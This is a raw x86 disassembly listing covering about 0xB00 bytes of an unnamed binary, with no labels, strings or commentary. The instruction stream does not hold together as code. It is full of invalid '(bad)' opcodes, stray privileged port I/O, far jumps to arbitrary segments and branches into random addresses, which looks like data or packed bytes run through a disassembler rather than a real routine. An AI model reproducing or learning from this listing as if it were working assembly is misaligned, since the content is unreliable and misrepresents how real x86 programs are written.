  422ca8:	pop    edx
  422ca9:	mov    cl,0x20
  422cab:	mov    al,ds:0xabe5cd52
  422cb0:	ins    DWORD PTR es:[edi],dx
  422cb1:	shl    DWORD PTR [edx+0x1f],cl
  422cb4:	xor    DWORD PTR [eax-0x4db9a791],edi
  422cba:	sbb    ecx,eax
  422cbc:	popf   
  422cbd:	jg     0x422cc9
  422cbf:	pushf  
  422cc0:	fild   DWORD PTR [edx-0x66ba4e51]
  422cc6:	xlat   BYTE PTR ds:[ebx]
  422cc7:	adc    eax,0x8bc4
  422ccc:	mov    bh,0x2f
  422cce:	cmp    al,BYTE PTR ds:0xb55962ab
  422cd4:	ins    DWORD PTR es:[edi],dx
  422cd5:	call   0x128b100
  422cda:	add    BYTE PTR [ecx+0xda349d4],al
  422ce0:	stos   DWORD PTR es:[edi],eax
  422ce1:	scas   al,BYTE PTR es:[edi]
  422ce2:	adc    BYTE PTR [edx-0x19],cl
  422ce5:	out    dx,eax
  422ce6:	mov    eax,0x48c74b33
  422ceb:	push   ecx
  422cec:	add    BYTE PTR [eax],al
  422cee:	xor    dh,BYTE PTR [bx+di]
  422cf1:	in     al,dx
  422cf2:	pop    ecx
  422cf3:	pop    esi
  422cf4:	test   al,0xd9
  422cf6:	das    
  422cf7:	shl    BYTE PTR [eax],0x0
  422cfa:	add    BYTE PTR [edi+0x67b6b011],al
  422d00:	test   al,0x2d
  422d02:	imul   eax,DWORD PTR ds:0xee141073,0x978e5459
  422d0c:	add    bl,BYTE PTR [eax-0x20]
  422d0f:	outs   dx,BYTE PTR ds:[esi]
  422d10:	les    eax,FWORD PTR ds:[eax+0x59760000]
  422d17:	mov    ds:0x775463a2,al
  422d1c:	xchg   esp,eax
  422d1d:	cmp    ch,ch
  422d1f:	scas   al,BYTE PTR es:[edi]
  422d20:	mov    cl,0x67
  422d22:	pop    ebx
  422d23:	cdq    
  422d24:	pop    ecx
  422d25:	pop    esp
  422d26:	jnp    0x422da2
  422d28:	cmp    edx,eax
  422d2a:	sub    al,0x73
  422d2c:	(bad)  
  422d2e:	push   ds
  422d2f:	xor    al,0xa0
  422d31:	add    al,BYTE PTR [ecx-0x461a810a]
  422d37:	mov    eax,ds:0xef97f454
  422d3c:	mov    DWORD PTR [ebp-0x1a],ecx
  422d3f:	pop    ebp
  422d40:	loope  0x422d6e
  422d42:	cdq    
  422d43:	dec    ecx
  422d44:	jl     0x422d8b
  422d46:	je     0x422d4a
  422d48:	into   
  422d49:	mov    al,ds:0x21e39abe
  422d4e:	mov    ch,0xa5
  422d50:	loopne 0x422dbd
  422d52:	or     eax,0x9f6976f8
  422d57:	hlt    
  422d58:	gs stos BYTE PTR es:[edi],al
  422d5a:	dec    edi
  422d5b:	push   ecx
  422d5c:	push   cs
  422d5d:	push   eax
  422d5e:	mov    eax,ds:0x31f69ca3
  422d63:	shl    dl,1
  422d65:	sbb    al,0x88
  422d67:	pusha  
  422d68:	add    BYTE PTR [eax],al
  422d6a:	in     al,0x72
  422d6c:	sbb    eax,0x60c995a3
  422d71:	push   eax
  422d72:	les    edi,FWORD PTR [edx+0x2b140000]
  422d78:	push   edi
  422d79:	jle    0x422d7d
  422d7b:	or     ebx,DWORD PTR [ecx]
  422d7d:	or     edx,esi
  422d7f:	repnz test al,0xa3
  422d82:	aaa    
  422d83:	int    0x29
  422d85:	add    al,0xb9
  422d87:	add    BYTE PTR [eax],al
  422d89:	push   edi
  422d8a:	mov    esi,0x4cf25922
  422d8f:	adc    eax,0xd0f50000
  422d94:	addr16 push 0x6a
  422d97:	frstor [edx+0xc]
  422d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d9b:	add    BYTE PTR [eax],al
  422d9d:	mov    ch,0xa7
  422d9f:	das    
  422da0:	cli    
  422da1:	out    0x5,eax
  422da3:	imul   ebp,DWORD PTR [eax+ebx*4],0x633687aa
  422daa:	test   al,cl
  422dac:	add    BYTE PTR [eax],al
  422dae:	xchg   ebx,eax
  422daf:	xor    eax,0xf721202a
  422db4:	push   eax
  422db5:	stc    
  422db6:	pop    eax
  422db7:	leave  
  422db8:	adc    al,cl
  422dba:	add    BYTE PTR [eax],al
  422dbc:	add    BYTE PTR [esi+0x39],bl
  422dbf:	and    eax,0x7c59af28
  422dc4:	xor    al,0x84
  422dc6:	add    BYTE PTR [eax],0x0
  422dc9:	and    eax,0xfff5dc0a
  422dce:	sub    eax,0xfac4
  422dd3:	fsubr  DWORD PTR [edi-0x749248f2]
  422dd9:	sti    
  422dda:	cwde   
  422ddb:	push   ecx
  422ddc:	retf   0x511f
  422ddf:	dec    esp
  422de0:	sub    BYTE PTR [eax],al
  422de2:	add    BYTE PTR [edi+0x7d88c23e],ch
  422de8:	add    BYTE PTR [eax],al
  422dea:	dec    ebx
  422deb:	lahf   
  422dec:	push   ebp
  422ded:	adc    DWORD PTR [ebx-0x75],ebx
  422df0:	fdiv   DWORD PTR [ecx]
  422df2:	push   ebx
  422df3:	ja     0x422dc7
  422df5:	xor    DWORD PTR [ebx+esi*8],0x1f
  422df9:	pop    ebx
  422dfa:	mov    edx,0x47e39ad5
  422dff:	iret   
  422e00:	into   
  422e01:	icebp  
  422e02:	inc    esi
  422e03:	pop    ebp
  422e04:	outs   dx,DWORD PTR ds:[esi]
  422e05:	daa    
  422e06:	ret    0x64e6
  422e09:	out    0x78,al
  422e0b:	adc    esi,DWORD PTR [esi]
  422e0d:	cld    
  422e0e:	cmp    al,0xe2
  422e10:	or     eax,0x8f6fa7c5
  422e15:	test   BYTE PTR [edx],bl
  422e17:	add    BYTE PTR [eax],al
  422e19:	cmp    eax,0x21879c51
  422e1e:	push   ebp
  422e1f:	bound  ebp,QWORD PTR [edi+0x14]
  422e22:	rcr    BYTE PTR [esi],1
  422e24:	cmp    cl,ah
  422e26:	repz add BYTE PTR [eax],al
  422e29:	ret    0x8dfb
  422e2c:	loop   0x422def
  422e2e:	aam    0x6a
  422e30:	mov    al,0xa7
  422e32:	jmp    0x422e13
  422e34:	lahf   
  422e35:	cmp    DWORD PTR [edx],0x7d
  422e38:	xor    al,0x6c
  422e3a:	push   cs
  422e3b:	in     eax,0x7c
  422e3d:	sbb    al,0xdf
  422e3f:	mov    ebx,DWORD PTR [ebx+0x41789e0f]
  422e45:	push   esp
  422e46:	std    
  422e47:	xchg   edi,eax
  422e48:	out    dx,al
  422e49:	pop    eax
  422e4a:	lods   eax,DWORD PTR ds:[esi]
  422e4b:	je     0x422e0a
  422e4d:	cld    
  422e4e:	aas    
  422e4f:	and    BYTE PTR [edi-0x21],dh
  422e52:	cmp    DWORD PTR [ebp+0x48],ebp
  422e55:	in     eax,0x0
  422e57:	add    BYTE PTR [ecx],bl
  422e59:	leave  
  422e5a:	jmp    0x87ea5bd9
  422e5f:	scas   eax,DWORD PTR es:[edi]
  422e60:	imul   ebp,ebx,0x76a5fb7a
  422e66:	sbb    eax,0xc72976aa
  422e6b:	inc    esi
  422e6c:	pop    ecx
  422e6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e6e:	xchg   DWORD PTR [ebx-0x7a],ebp
  422e71:	lods   eax,DWORD PTR ds:[esi]
  422e72:	mov    WORD PTR [edx+0x0],?
  422e75:	add    cl,ch
  422e77:	mov    ds:0x703b1f8b,al
  422e7c:	jle    0x422e54
  422e7e:	test   DWORD PTR [edi-0xd67eda1],esp
  422e84:	stc    
  422e85:	out    dx,eax
  422e86:	jo     0x422ef0
  422e88:	je     0x422e64
  422e8a:	jmp    0x422eb2
  422e8c:	stos   BYTE PTR es:[edi],al
  422e8d:	pop    ds
  422e8e:	shr    DWORD PTR [ebx-0x57596f65],1
  422e94:	push   ds
  422e95:	shr    DWORD PTR [eax],0x6f
  422e98:	nop
  422e99:	test   BYTE PTR ds:0xe4c80000,ch
  422e9f:	add    BYTE PTR [eax],al
  422ea1:	inc    ebp
  422ea2:	inc    edx
  422ea3:	in     al,0xa9
  422ea5:	sbb    al,0xc0
  422ea7:	pop    ecx
  422ea8:	add    BYTE PTR [eax],al
  422eaa:	sub    BYTE PTR [esi],bl
  422eac:	jne    0x422e8f
  422eae:	jb     0x422e91
  422eb0:	ret    0x15d7
  422eb3:	and    BYTE PTR ds:0xc749ce6e,al
  422eb9:	ja     0x422ed6
  422ebb:	sub    DWORD PTR [edi-0x7b],eax
  422ebe:	sti    
  422ebf:	fs inc edi
  422ec1:	inc    esi
  422ec2:	(bad)  
  422ec4:	mov    WORD PTR [esi],ss
  422ec6:	add    BYTE PTR [eax],al
  422ec8:	test   eax,0x663dc1c
  422ecd:	pop    esp
  422ece:	jbe    0x422e65
  422ed0:	fistp  DWORD PTR [ebx]
  422ed2:	ror    BYTE PTR [ecx-0x46be1258],1
  422ed8:	sub    eax,DWORD PTR [ebp+0x71]
  422edb:	xchg   edi,eax
  422edc:	xchg   ebp,eax
  422edd:	xchg   ecx,eax
  422ede:	enter  0xff,0x0
  422ee2:	push   esi
  422ee3:	pop    esi
  422ee4:	fwait
  422ee5:	nop
  422ee6:	out    0xfe,al
  422ee8:	cmp    al,0xb8
  422eea:	cdq    
  422eeb:	dec    ebp
  422eec:	push   eax
  422eed:	sub    DWORD PTR [eax+0x20],esp
  422ef0:	push   es
  422ef1:	mov    WORD PTR [edx-0x6d020000],fs
  422ef7:	xchg   ebx,eax
  422ef8:	aad    0xaf
  422efa:	dec    ebx
  422efb:	xor    dh,BYTE PTR [esi]
  422efd:	fdiv   st,st(2)
  422eff:	push   ebp
  422f00:	fimul  WORD PTR [esi+edx*2]
  422f03:	add    BYTE PTR [eax],al
  422f05:	loope  0x422e88
  422f07:	push   ss
  422f08:	dec    eax
  422f09:	stos   DWORD PTR es:[edi],eax
  422f0a:	add    BYTE PTR [eax],al
  422f0c:	dec    ebp
  422f0d:	addr16 gs addr16 retf 0xa686
  422f13:	call   0x19:0xc8ec5ce
  422f1a:	add    BYTE PTR ds:0x2e9dddac,cl
  422f20:	sub    al,0xe0
  422f22:	or     DWORD PTR [edi+0x685cc6f0],ebp
  422f28:	imul   ebx,DWORD PTR [ebx],0xffffffa4
  422f2b:	dec    ebp
  422f2c:	jne    0x422ed1
  422f2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f2f:	ds test eax,0xcc595701
  422f35:	jle    0x422f37
  422f37:	add    bh,dl
  422f39:	or     BYTE PTR [ebp-0x14c20000],dl
  422f3f:	psraw  mm5,QWORD PTR [esp+eiz*4-0x316b602b]
  422f47:	mov    eax,ds:0x7757d123
  422f4c:	dec    edx
  422f4d:	and    DWORD PTR [ebx+edx*8+0x77],edx
  422f51:	cmp    edx,ebp
  422f53:	fdiv   st,st(0)
  422f55:	into   
  422f56:	dec    edx
  422f57:	pop    edi
  422f58:	arpl   WORD PTR [esi+0x63],bp
  422f5b:	mov    ds:0xbe43acef,eax
  422f60:	aam    0x5d
  422f62:	test   eax,0x6284c5
  422f67:	add    BYTE PTR [esi+0x1a],al
  422f6a:	dec    eax
  422f6b:	fadd   QWORD PTR [eax]
  422f6d:	add    BYTE PTR [esi-0xa],ch
  422f70:	pop    ss
  422f71:	hlt    
  422f72:	mov    eax,0x8304
  422f77:	cdq    
  422f78:	cmp    al,0x5b
  422f7a:	jg     0x422f3b
  422f7c:	adc    WORD PTR [ebp+ebx*8+0x1e],0x398f
  422f83:	add    dl,BYTE PTR [ecx-0x17fdfab2]
  422f89:	sub    ecx,DWORD PTR [esi-0x3094db66]
  422f8f:	cmc    
  422f90:	enter  0x5e,0x0
  422f94:	inc    esi
  422f95:	jb     0x422f9b
  422f97:	adc    eax,DWORD PTR [eax]
  422f99:	add    BYTE PTR [edx+0x47847529],ch
  422f9f:	add    BYTE PTR [eax],al
  422fa1:	jmp    0xc62edfc2
  422fa6:	xlat   BYTE PTR ds:[ebx]
  422fa7:	push   eax
  422fa8:	icebp  
  422fa9:	add    eax,DWORD PTR [ebp-0x1b5eedc7]
  422faf:	sub    esi,eax
  422fb1:	push   esp
  422fb2:	ins    DWORD PTR es:[edi],dx
  422fb3:	fdiv   DWORD PTR ds:[ebx-0x6a]
  422fb7:	bound  eax,QWORD PTR [ecx+0x2c4aa883]
  422fbd:	jge    0x422f4b
  422fbf:	out    dx,al
  422fc0:	add    BYTE PTR [eax],al
  422fc2:	inc    esi
  422fc3:	retf   0xe811
  422fc6:	ss push 0xffffffa0
  422fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fca:	mov    ds:0xde903814,eax
  422fcf:	cmc    
  422fd0:	icebp  
  422fd1:	into   
  422fd2:	xor    al,0xb7
  422fd4:	lock xlat BYTE PTR ss:[ebx]
  422fd7:	out    0xff,eax
  422fd9:	ds int3 
  422fdb:	js     0x422fdd
  422fdd:	add    BYTE PTR [edx+0x3f3c2270],bh
  422fe3:	xor    edx,DWORD PTR [esi]
  422fe5:	inc    esp
  422fe6:	popa   
  422fe7:	add    BYTE PTR [eax],al
  422fe9:	call   0xc417:0xc7b4daf2
  422ff0:	add    DWORD PTR [eax],eax
  422ff2:	add    BYTE PTR [ebx-0x5d],cl
  422ff5:	(bad)  
  422ff6:	call   0xfbc1b6f6
  422ffb:	out    dx,eax
  422ffc:	stos   DWORD PTR es:[edi],eax
  422ffd:	mov    dl,0xca
  422fff:	mov    cl,0x11
  423001:	and    DWORD PTR [edx],eax
  423003:	sbb    BYTE PTR [edx-0x68039e19],al
  423009:	xchg   ebp,eax
  42300a:	mov    ecx,0x5768f419
  42300f:	mov    eax,0x3b4dd71
  423014:	fsubr  QWORD PTR [edx+0x18]
  423017:	xchg   BYTE PTR [ebx-0x62],al
  42301a:	mov    cl,0x34
  42301c:	pop    edx
  42301d:	and    esp,DWORD PTR [edi-0x4d]
  423020:	imul   ebp
  423022:	arpl   WORD PTR [edi],ax
  423024:	jo     0x422fc5
  423026:	pop    eax
  423027:	dec    eax
  423028:	out    dx,al
  423029:	add    BYTE PTR [eax],al
  42302b:	bound  edi,QWORD PTR ds:0xb2fe4366
  423031:	outs   dx,BYTE PTR ds:[esi]
  423032:	inc    edi
  423033:	(bad)  
  423034:	sub    edx,DWORD PTR [ebx]
  423036:	mov    esi,0xa76ee4e7
  42303b:	fnsave [eax]
  42303d:	dec    ebp
  42303e:	inc    ecx
  42303f:	cmp    eax,0xef2bc22f
  423044:	and    bl,BYTE PTR [ebx-0x1b]
  423047:	clc    
  423048:	mov    cl,0x8f
  42304a:	mov    ch,0xa0
  42304c:	jp     0x422fe8
  42304e:	dec    esi
  42304f:	xchg   esp,edi
  423051:	jae    0x4230ae
  423053:	cld    
  423054:	sbb    ecx,ebx
  423056:	(bad)  
  423057:	mov    esi,0xdf94b3d6
  42305c:	rcl    BYTE PTR [ebx+0x0],0x0
  423060:	or     DWORD PTR [ecx-0x1b],ebp
  423063:	inc    eax
  423064:	push   ss
  423065:	add    BYTE PTR [eax],al
  423067:	aaa    
  423068:	(bad)  
  423069:	fmul   DWORD PTR [ecx-0x1]
  42306c:	leave  
  42306d:	sub    DWORD PTR [eax+0xdbe143f],ebp
  423073:	jae    0x423028
  423075:	aad    0xab
  423077:	(bad)  
  423078:	les    ebp,FWORD PTR es:[ebp-0x7aa50000]
  42307f:	sbb    ebp,DWORD PTR ss:[ecx]
  423082:	clc    
  423083:	les    ebx,FWORD PTR [eax+eax*1-0x12c81200]
  42308a:	pop    ss
  42308b:	jno    0x4230a9
  42308d:	ins    DWORD PTR es:[edi],dx
  42308e:	aas    
  42308f:	mov    ebx,0x3de21175
  423094:	in     al,dx
  423095:	add    al,0x73
  423097:	add    BYTE PTR [eax],al
  423099:	cmc    
  42309a:	loopne 0x423079
  42309c:	fsub   QWORD PTR [edx+0x7a907275]
  4230a2:	test   esp,0x90000bb
  4230a8:	jp     0x4230ae
  4230aa:	outs   dx,BYTE PTR ds:[esi]
  4230ab:	add    BYTE PTR [eax],al
  4230ad:	adc    bl,ch
  4230af:	lea    edx,cs:[esi+ebp*4]
  4230b3:	in     al,dx
  4230b4:	add    al,0x3d
  4230b6:	add    BYTE PTR [eax],al
  4230b8:	(bad)  
  4230b9:	in     al,0x76
  4230bb:	mov    ah,0x62
  4230bd:	sbb    bh,BYTE PTR [eax+0x1f88767b]
  4230c3:	add    BYTE PTR [eax],al
  4230c5:	mov    al,0xfb
  4230c7:	pusha  
  4230c8:	int3   
  4230c9:	jnp    0x4230cb
  4230cb:	add    BYTE PTR [ebp-0xd],cl
  4230ce:	or     eax,DWORD PTR [edi-0x3da865a9]
  4230d4:	xchg   DWORD PTR [ecx],ecx
  4230d6:	xor    al,0x74
  4230d8:	lods   al,BYTE PTR ds:[esi]
  4230d9:	out    dx,eax
  4230da:	lods   al,BYTE PTR ds:[esi]
  4230db:	mov    DWORD PTR [ebp-0x67],edx
  4230de:	cld    
  4230df:	shl    dl,1
  4230e1:	xchg   edi,eax
  4230e2:	fsubr  DWORD PTR [ecx+0x760ba3f]
  4230e8:	cs and bh,0x5e
  4230ec:	sub    DWORD PTR [eax-0x5],0xb704b9f0
  4230f3:	add    BYTE PTR [eax],al
  4230f5:	sar    DWORD PTR [edi-0x53],1
  4230f8:	push   0xa28e1c1c
  4230fd:	push   eax
  4230fe:	pop    esi
  4230ff:	gs (bad) 
  423101:	cmp    ebx,DWORD PTR [esi-0x76]
  423104:	push   esi
  423105:	jle    0x42310c
  423107:	ins    BYTE PTR es:[edi],dx
  423108:	xor    ebx,esp
  42310a:	ret    
  42310b:	jno    0x423091
  42310d:	mov    dh,0x0
  42310f:	add    BYTE PTR [eax+0x7173b96],ah
  423115:	ds iret 
  423117:	(bad)  
  423118:	jae    0x4230af
  42311a:	and    DWORD PTR [esi-0x22],0x6a
  42311e:	out    0x49,al
  423120:	ret    0xf6ba
  423123:	pusha  
  423124:	addr16 pushf 
  423126:	or     ebp,eax
  423128:	adc    esp,esp
  42312a:	ror    DWORD PTR [edi-0x59],1
  42312d:	xor    edi,eax
  42312f:	clc    
  423130:	add    al,0x4a
  423132:	add    BYTE PTR [eax],al
  423134:	jl     0x4230db
  423136:	test   esi,ebp
  423138:	fcomp  st(3)
  42313a:	jo     0x4230c2
  42313c:	jb     0x4231a5
  42313e:	popf   
  42313f:	js     0x4230fa
  423141:	int3   
  423142:	cmp    al,BYTE PTR [eax]
  423144:	add    dh,ah
  423146:	das    
  423147:	daa    
  423148:	push   eax
  423149:	test   BYTE PTR [edi+0x0],dl
  42314c:	add    al,ch
  42314e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42314f:	mov    ds:0x73ce8da0,eax
  423154:	loop   0x42311e
  423156:	dec    edi
  423157:	add    BYTE PTR [eax],al
  423159:	and    edx,ecx
  42315b:	cwde   
  42315c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42315d:	pop    edx
  42315e:	pop    ebx
  42315f:	jbe    0x423122
  423161:	enter  0xc1,0x0
  423165:	popa   
  423166:	aad    0x2f
  423168:	iret   
  423169:	pop    ecx
  42316a:	and    BYTE PTR [edi],dl
  42316c:	and    ebx,DWORD PTR [ebp-0x6f]
  42316f:	sub    ah,BYTE PTR [ebp-0x16]
  423172:	(bad)  
  423173:	in     eax,0x9b
  423175:	cld    
  423176:	into   
  423177:	inc    ebx
  423178:	push   ss
  423179:	adc    DWORD PTR [ecx],ecx
  42317b:	push   eax
  42317c:	out    0xdc,eax
  42317e:	je     0x42311f
  423180:	sbb    eax,0x2a2a6a41
  423185:	xchg   ebp,eax
  423186:	repnz or DWORD PTR [edi-0x24],ecx
  42318a:	enter  0xf0,0x0
  42318e:	adc    esi,ecx
  423190:	mov    esi,eax
  423192:	mov    ch,0x7a
  423194:	(bad)  
  423195:	xlat   BYTE PTR ds:[ebx]
  423196:	idiv   BYTE PTR [ebx+0x6470b7da]
  42319c:	pop    es
  42319d:	xchg   ebp,eax
  42319e:	loope  0x42316b
  4231a0:	add    ch,al
  4231a2:	add    BYTE PTR [eax],al
  4231a4:	nop
  4231a5:	mov    ebp,0x6294f617
  4231aa:	dec    esp
  4231ab:	stos   DWORD PTR es:[edi],eax
  4231ac:	add    BYTE PTR [eax],al
  4231ae:	xchg   esi,eax
  4231af:	xchg   esi,eax
  4231b0:	dec    esp
  4231b1:	xchg   esi,eax
  4231b2:	add    BYTE PTR [eax],al
  4231b4:	xchg   edi,eax
  4231b5:	sub    ebx,DWORD PTR [ecx+0x3c]
  4231b8:	add    ecx,DWORD PTR [esi]
  4231ba:	or     BYTE PTR [edx+0x0],cl
  4231bd:	add    BYTE PTR [eax],bh
  4231bf:	imul   edx,DWORD PTR [ecx],0xfffffff6
  4231c2:	jbe    0x42316e
  4231c4:	es push ecx
  4231c6:	scas   al,BYTE PTR es:[edi]
  4231c7:	and    dh,BYTE PTR [ebp-0xed5f8f6]
  4231cd:	mov    ch,0x29
  4231cf:	jge    0x423205
  4231d1:	clc    
  4231d2:	shr    DWORD PTR [eax-0x61],cl
  4231d5:	popf   
  4231d6:	xchg   ebx,eax
  4231d7:	out    dx,al
  4231d8:	mov    ds:0x67752d1b,al
  4231dd:	call   0x4a356574
  4231e2:	inc    edx
  4231e3:	push   ds
  4231e4:	mov    esp,0xecad8d29
  4231e9:	xor    DWORD PTR [eax+ebp*4],eax
  4231ec:	add    BYTE PTR [eax],al
  4231ee:	add    eax,DWORD PTR [ebx-0x68]
  4231f1:	loopne 0x423185
  4231f3:	mov    cl,0xc6
  4231f5:	push   ebx
  4231f6:	cs dec edi
  4231f8:	add    BYTE PTR [edi],al
  4231fa:	add    BYTE PTR [eax],al
  4231fc:	inc    ebp
  4231fd:	das    
  4231fe:	and    BYTE PTR [ecx-0x1d],0xe2
  423202:	in     al,0x9a
  423204:	push   0xab5b0911
  423209:	in     al,0xba
  42320b:	out    0x9e,eax
  42320d:	mov    edx,0x8b2ff70f
  423212:	loopne 0x423275
  423214:	repz ror DWORD PTR [ecx],cl
  423217:	cmp    eax,0xa0ba6e4b
  42321c:	adc    DWORD PTR [ecx+0x7f],ebp
  42321f:	inc    ecx
  423220:	or     ah,cl
  423222:	add    BYTE PTR [eax],al
  423224:	fwait
  423225:	call   0xc8a57fec
  42322a:	add    BYTE PTR [eax],0x0
  42322d:	lods   eax,DWORD PTR ds:[esi]
  42322e:	loopne 0x423238
  423230:	stos   BYTE PTR es:[edi],al
  423231:	add    BYTE PTR [eax],al
  423233:	xor    DWORD PTR [ecx],esp
  423235:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423236:	sbb    esp,DWORD PTR [ecx+0x49cd7302]
  42323c:	cmp    ah,BYTE PTR [ebp-0x1b]
  42323f:	sub    BYTE PTR [eax-0x6c],0x38
  423243:	add    ebx,DWORD PTR [ebx-0xf]
  423246:	and    bl,ah
  423248:	inc    esp
  423249:	mov    dl,0x0
  42324b:	add    BYTE PTR [eax+0x44aa891d],ah
  423251:	inc    ebx
  423252:	add    BYTE PTR [eax],al
  423254:	xchg   esi,eax
  423255:	xor    edi,ecx
  423257:	sub    edx,DWORD PTR [ebp+ecx*4-0x2e75dada]
  42325e:	iret   
  42325f:	leave  
  423260:	mov    al,ds:0x7a9b7652
  423265:	pop    edi
  423266:	call   0x44228db0
  42326b:	inc    ecx
  42326c:	dec    eax
  42326d:	jle    0x42326f
  42326f:	add    cl,al
  423271:	out    0xd7,eax
  423273:	mov    al,ds:0x7dcc2e14
  423278:	add    BYTE PTR [eax],al
  42327a:	fist   DWORD PTR ds:0x9fe429d
  423280:	sar    DWORD PTR [edx+0x59453006],1
  423286:	cmp    DWORD PTR [esi-0x7e430cf0],0xcc089ff7
  423290:	add    BYTE PTR [eax],al
  423292:	mov    DWORD PTR ds:0xe5c01189,ecx
  423298:	add    BYTE PTR [eax],al
  42329a:	mov    BYTE PTR [edi],ah
  42329c:	add    BYTE PTR [eax],al
  42329e:	es cdq 
  4232a0:	inc    ecx
  4232a1:	lods   eax,DWORD PTR ds:[esi]
  4232a2:	pop    es
  4232a3:	sbb    dl,BYTE PTR [edx-0x2e]
  4232a6:	js     0x4232b2
  4232a8:	out    0x28,eax
  4232aa:	or     dl,BYTE PTR [ecx]
  4232ac:	push   edx
  4232ad:	mov    esp,DWORD PTR [ebx-0xca5d21c]
  4232b3:	ret    0x9254
  4232b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b8:	add    DWORD PTR [eax],eax
  4232ba:	sub    eax,0x5a0e0000
  4232bf:	scas   al,BYTE PTR es:[edi]
  4232c0:	adc    al,0xd4
  4232c2:	xchg   esp,eax
  4232c3:	ds push ebx
  4232c5:	mov    dl,0xaa
  4232c7:	sbb    eax,0x9c86d7da
  4232cc:	shl    ecx,1
  4232ce:	fwait
  4232cf:	lahf   
  4232d0:	mov    eax,ds:0xa70e2d8
  4232d5:	aad    0x20
  4232d7:	mov    al,ds:0xd06bf1e3
  4232dc:	sbb    DWORD PTR [eax],edx
  4232de:	cmp    eax,0x36b631d5
  4232e3:	movsx  ebp,bl
  4232e6:	out    0x41,al
  4232e8:	pop    edx
  4232e9:	test   al,0x81
  4232eb:	push   cs
  4232ec:	por    mm5,QWORD PTR fs:[ebx+ebp*8]
  4232f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232f2:	mov    edi,DWORD PTR [esi+edx*2]
  4232f5:	and    BYTE PTR [edx-0x1e],0x50
  4232f9:	mov    ds:0x87e63e42,al
  4232fe:	jl     0x423297
  423300:	retf   
  423301:	nop
  423302:	jge    0x4232c6
  423304:	icebp  
  423305:	push   0x3f
  423307:	mov    al,ds:0x81e9b2af
  42330c:	cmp    BYTE PTR [eax-0x2e],ah
  42330f:	or     DWORD PTR [esi+ebp*4+0x1977b79c],esp
  423316:	xchg   DWORD PTR [eax+0x2e000042],ecx
  42331c:	or     al,0x11
  42331e:	add    BYTE PTR [eax],al
  423320:	pop    edx
  423321:	xor    al,0xa9
  423323:	ret    0x7787
  423326:	xchg   esp,eax
  423327:	mov    al,0xab
  423329:	ret    
  42332a:	cdq    
  42332b:	call   0x8d9d:0xdad2bafd
  423332:	jmp    0x337ccf16
  423337:	or     BYTE PTR [ebx],cl
  423339:	add    BYTE PTR [eax],al
  42333b:	test   DWORD PTR [esi],edx
  42333d:	mov    eax,0x1feef747
  423342:	or     eax,0xa33ca2ea
  423347:	pop    ecx
  423348:	sbb    DWORD PTR [ecx+0xa78c],esi
  42334e:	push   ebp
  42334f:	and    DWORD PTR [eax+0x9],ecx
  423352:	add    BYTE PTR [eax],al
  423354:	cdq    
  423355:	sbb    dh,BYTE PTR [ebx-0x509f6ce2]
  42335b:	adc    eax,0xebc27d3d
  423360:	pop    edi
  423361:	cmp    ah,BYTE PTR [ebp+0x1d]
  423364:	int    0x93
  423366:	cli    
  423367:	jnp    0x423315
  423369:	fisub  WORD PTR [ebp-0x4]
  42336c:	add    esp,ebp
  42336e:	repz and eax,0xbc07783f
  423374:	mov    al,0x11
  423376:	in     eax,dx
  423377:	idiv   ah
  423379:	fldenv [eax]
  42337b:	xchg   ebp,eax
  42337c:	or     ebp,ebx
  42337e:	ret    0xc3b5
  423381:	mov    ds:0x96ce56e1,al
  423386:	push   cs
  423387:	stos   BYTE PTR es:[edi],al
  423388:	frstor [edx+0x30]
  42338b:	mov    eax,0xca18d27
  423390:	inc    edi
  423391:	add    BYTE PTR [eax],al
  423393:	fsubr  st(7),st
  423395:	pusha  
  423396:	push   ecx
  423397:	das    
  423398:	xor    al,0x39
  42339a:	retf   0x3ab0
  42339d:	jno    0x423358
  42339f:	daa    
  4233a0:	sbb    edx,DWORD PTR [ecx-0x18b538d7]
  4233a6:	pushf  
  4233a7:	loop   0x4233e1
  4233a9:	mov    edi,0xde636665
  4233ae:	scas   eax,DWORD PTR es:[edi]
  4233af:	dec    edx
  4233b0:	je     0x42336b
  4233b2:	int    0x58
  4233b4:	cmp    BYTE PTR [esi+esi*1+0x0],cl
  4233b8:	add    ch,ch
  4233ba:	(bad)  
  4233bb:	jmp    0x89:0x80741315
  4233c2:	add    BYTE PTR [eax-0x66],al
  4233c5:	add    BYTE PTR [eax],al
  4233c7:	ret    0xe021
  4233ca:	int    0x85
  4233cc:	mov    dl,0x9b
  4233ce:	(bad)  
  4233cf:	shl    DWORD PTR [ebp-0x49b1da31],1
  4233d5:	mov    ah,0x11
  4233d7:	or     BYTE PTR [eax+eax*1],dl
  4233da:	add    BYTE PTR [ebx+0x41],ch
  4233dd:	pop    edx
  4233de:	xchg   ebx,eax
  4233df:	sub    BYTE PTR [eax+0x60f2abba],bl
  4233e5:	arpl   bp,ax
  4233e7:	(bad)  [esi+0x34]
  4233ea:	push   ebp
  4233eb:	icebp  
  4233ec:	pop    edi
  4233ed:	(bad)  
  4233ee:	fsin   
  4233f0:	lods   al,BYTE PTR ds:[esi]
  4233f1:	xor    DWORD PTR [ecx-0xf619b8e],ebp
  4233f7:	sbb    al,bh
  4233f9:	adc    al,0x64
  4233fb:	jmp    0xdff8:0x7bbf3698
  423402:	sub    esi,ecx
  423404:	iret   
  423405:	xchg   edi,eax
  423406:	push   cs
  423407:	mov    bh,0x11
  423409:	sbb    BYTE PTR [ebp+0x30],dl
  42340c:	inc    ebx
  42340d:	fidiv  DWORD PTR [ebx+0x7abf71aa]
  423413:	enter  0x4c,0x0
  423417:	jnp    0x4233e1
  423419:	sub    al,0x0
  42341b:	add    ch,ah
  42341d:	xor    ah,al
  42341f:	lods   eax,DWORD PTR ds:[esi]
  423420:	add    BYTE PTR [eax],al
  423422:	jp     0x4233b9
  423424:	cdq    
  423425:	jmp    0x40:0x44bd4a49
  42342c:	add    al,dl
  42342e:	and    al,BYTE PTR [eax]
  423430:	jmp    0x423432
  423432:	add    dl,cl
  423434:	ror    DWORD PTR [di-0x1f76],0x9a
